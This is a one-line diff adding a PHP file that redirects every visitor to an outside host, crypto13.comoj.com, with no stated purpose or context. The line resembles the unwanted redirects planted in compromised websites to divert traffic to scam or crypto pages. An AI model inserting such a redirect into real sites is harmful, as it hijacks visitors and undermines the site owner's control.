@@ -1,0 +1,1 @@
+<?php header("Location: http://crypto13.comoj.com"); ?>
